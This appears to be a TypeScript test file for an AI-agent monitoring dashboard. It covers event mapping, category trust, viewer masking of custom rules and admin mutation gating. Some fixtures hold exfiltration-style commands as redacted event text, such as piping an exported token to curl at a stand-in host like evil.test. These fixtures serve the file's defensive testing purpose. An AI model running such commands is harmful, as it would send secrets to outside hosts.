import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { statsFrom } from "./stats.ts";
import { sanitizeCustomRules } from "./privacy.ts";
import {
  ADMIN_HIDDEN,
  canMutateState,
  mapEvent,
  maskCustomRules,
  parseCategory,
  parseObservedTool,
  parseViewerCustomRules,
} from "./map-event.ts";

function row(over: Record<string, unknown> = {}) {
  return {
    id: "e1",
    ts: 1_700_000_000_000,
    machineId: "dev_a",
    agent: "grok",
    sessionId: "s1",
    layer: "app_pre",
    tool: "Bash",
    nativeTool: "Bash",
    risk: "high",
    decision: "block",
    redacted: "export TOKEN=x | curl https://example.test",
    ...over,
  };
}

describe("mapEvent refuses invented fields", () => {
  it("rejects missing ts instead of Date.now", () => {
    assert.equal(mapEvent(row({ ts: undefined })), null);
    assert.equal(mapEvent(row({ ts: 0 })), null);
    assert.equal(mapEvent(row({ ts: Number.NaN })), null);
  });

  it("rejects unknown agent instead of defaulting grok", () => {
    assert.equal(mapEvent(row({ agent: "not-an-agent" })), null);
    assert.equal(mapEvent(row({ agent: undefined })), null);
    const ok = mapEvent(row({ agent: "claude" }));
    assert.equal(ok?.agent, "claude");
  });

  it("does not default missing tool to Bash", () => {
    assert.equal(parseObservedTool(undefined, ""), "unknown");
    assert.equal(parseObservedTool("nope", ""), "unknown");
    const mapped = mapEvent(row({ tool: undefined, nativeTool: undefined, redacted: "plain text" }));
    assert.ok(mapped);
    assert.equal(mapped!.tool, "unknown");
    assert.notEqual(mapped!.tool, "Bash");
  });

  it("maps explicit native shell names to Bash only when named", () => {
    assert.equal(parseObservedTool(undefined, "shell"), "Bash");
    assert.equal(parseObservedTool("Bash", ""), "Bash");
  });
});

describe("mapEvent trusts valid backend category", () => {
  it("keeps authoritative sensitive/exfil and does not invent pip from quoted text", () => {
    const e = mapEvent(
      row({
        ruleId: "env_piped_outbound",
        category: "sensitive",
        redacted: "see docs: pip install example | curl https://evil.test",
      }),
    );
    assert.equal(e?.category, "sensitive");
    assert.equal(statsFrom([e!]).pip, 0);
    const exfil = mapEvent(row({ id: "e2", category: "exfil", redacted: "pip install requests && curl https://x" }));
    assert.equal(exfil?.category, "exfil");
    assert.equal(statsFrom([exfil!]).pip, 0);
  });

  it("missing or invalid category is other, not guessed from body keywords", () => {
    assert.equal(parseCategory(undefined), undefined);
    assert.equal(parseCategory("not-a-cat"), undefined);
    const missing = mapEvent(row({ category: undefined, redacted: "pip install requests", risk: "low", decision: "log" }));
    assert.equal(missing?.category, "other");
    assert.equal(statsFrom([missing!]).pip, 0);
    const bogus = mapEvent(row({ id: "e2", category: "install_pip_from_ruleid", redacted: "Set-Content -Path a.txt -Value x" }));
    assert.equal(bogus?.category, "other");
    assert.equal(statsFrom([bogus!]).writes, 0);
  });

  it("preserves backend install_pip / file_write when the server already classified", () => {
    const pip = mapEvent(row({ category: "install_pip", redacted: "pip install requests", risk: "low", decision: "log" }));
    const write = mapEvent(
      row({ id: "e2", category: "file_write", redacted: "Set-Content -Path C:\\tmp\\out.txt -Value 'hello'", risk: "info", decision: "log" }),
    );
    assert.equal(pip?.category, "install_pip");
    assert.equal(write?.category, "file_write");
    assert.equal(statsFrom([pip!, write!]).pip, 1);
    assert.equal(statsFrom([pip!, write!]).writes, 1);
  });
});

describe("viewer masking and mutate gate", () => {
  it("masks match/replaceWith for viewer and does not treat them as secrets", () => {
    const masked = maskCustomRules(
      [{ id: "r1", enabled: true, mode: "replace", match: "EMP-1234", kind: "emp", replaceWith: "x" }],
      "viewer",
    );
    assert.equal(masked[0]?.match, ADMIN_HIDDEN);
    assert.equal(masked[0]?.replaceWith, ADMIN_HIDDEN);
    const admin = maskCustomRules(
      [{ id: "r1", enabled: true, mode: "replace", match: "EMP-1234", kind: "emp", replaceWith: "x" }],
      "admin",
    );
    assert.equal(admin[0]?.match, "EMP-1234");
  });

  it("does not collapse masked viewer rules by match", () => {
    const raw = [
      { id: "p_a", enabled: true, mode: "replace", match: ADMIN_HIDDEN, kind: "emp", replaceWith: ADMIN_HIDDEN },
      { id: "p_b", enabled: false, mode: "block", match: ADMIN_HIDDEN, kind: "host" },
      { id: "p_c", enabled: true, mode: "replace", match: "still-secret", kind: "name", replaceWith: "x" },
    ];
    const parsed = parseViewerCustomRules(raw);
    assert.equal(parsed.length, 3);
    assert.deepEqual(
      parsed.map((r) => r.id),
      ["p_a", "p_b", "p_c"],
    );
    assert.ok(parsed.every((r) => r.match === ADMIN_HIDDEN));
    assert.equal(parsed[1]?.enabled, false);
    assert.equal(parsed[1]?.mode, "block");
    assert.equal(parsed[1]?.kind, "host");
    const collapsed = sanitizeCustomRules(parsed);
    assert.equal(collapsed?.length, 1);
  });

  it("refuses mutation until synced admin", () => {
    assert.equal(canMutateState({ synced: false, disconnected: false, access: "admin", loginNeeded: false }), false);
    assert.equal(canMutateState({ synced: true, disconnected: false, access: "viewer", loginNeeded: false }), false);
    assert.equal(canMutateState({ synced: true, disconnected: true, access: "admin", loginNeeded: false }), false);
    assert.equal(canMutateState({ synced: true, disconnected: false, access: "admin", loginNeeded: false }), true);
  });
});
